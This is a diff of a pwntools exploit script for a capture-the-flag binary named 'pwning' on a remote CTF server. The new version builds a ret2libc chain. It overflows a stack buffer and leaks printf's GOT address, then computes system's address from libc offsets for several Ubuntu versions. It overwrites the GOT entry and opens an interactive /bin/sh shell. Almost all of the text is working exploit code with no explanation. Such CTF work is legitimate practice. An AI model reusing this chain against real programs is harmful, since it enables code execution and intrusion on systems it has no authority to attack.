@@ -3,38 +3,61 @@ import code
 import time
 from pwn import *
 
-#p = remote('ctf.j0n9hyun.xyz',3019)
-p = process('./pwning')
+p = remote('ctf.j0n9hyun.xyz',3019)
+#p = process('./pwning')
 
-input('attach gdb')
+#input('attach gdb')
 
 e = ELF('./pwning')
-bss = 0x804a040
-bss_8 = bss+8
-int80 = 0x80484d0
+printf_plt = e.plt['printf']
+printf_got = e.got['printf']
+get_n = e.sym['get_n']
+
+print('[*] printf@plt ', hex(printf_plt))
+print('[*] printf@got ', hex(printf_got))
+
+bss = 0x0804a040
+poppoppopret = 0x804835a
+popret = poppoppopret+3
 
 print(p.recv())
 p.sendline('-1')
 print(p.recv())
 
-rop = ROP(e)
-rop.raw(b'a'*0x2c)
-rop.raw(b'b'*0x4)
-rop.call('getchar')	# test
-rop.call('getchar')	# test
-rop.call('getchar')	# test
-rop.call('getchar')	# test
-rop.call('get_n', [bss_8, 8])	# input '/bin/sh\x00'
-rop.call('get_n', [bss_8+8, 2])	# input "11"
-rop.call('atoi', [bss_8+8])
-rop.raw(rop.ebx.address)
-rop.raw(bss_8)
-rop.raw(int80)
+context.arch = 'i386'
 
-print(rop.dump())
+payload = b""
+payload += b"a"*0x2c
+payload += b"b"*0x4
+payload += p32(printf_plt)
+payload += p32(popret)
+payload += p32(printf_got)
+payload += p32(get_n)	# write /bin/sh\x00
+payload += p32(poppoppopret)
+payload += p32(bss)	
+payload += p32(0xffffffff)
+payload += p32(0xffffffff)
+payload += p32(get_n)	# write system_addr
+payload += p32(poppoppopret)	
+payload += p32(printf_got)
+payload += p32(0xffffffff)
+payload += p32(0xffffffff)
+payload += p32(0x08048576)	# call printf
+#payload += p32(popret)
+payload += p32(bss)
 
-p.sendline(rop.chain())
+p.sendline(payload)
 time.sleep(0.2)
-p.sendline(b'/bin//sh')
-
+print(p.recvline())
+printf_addr = unpack(p.recv(4), 'all', endian='little')
+#system_addr = printf_addr-0x14150	# ubuntu 18.04
+#system_addr = printf_addr-0xe8d0	# ubuntu 16.04
+#system_addr = printf_addr-0xeb10	# ubuntu 20.04
+system_addr = printf_addr-0xe6e0
+print('[*] printf : ', hex(printf_addr))
+print('[*] system : ', hex(system_addr))
+p.sendline(b'/bin/sh')
+time.sleep(0.2)
+p.sendline(p32(system_addr))
+time.sleep(0.2)
 p.interactive()
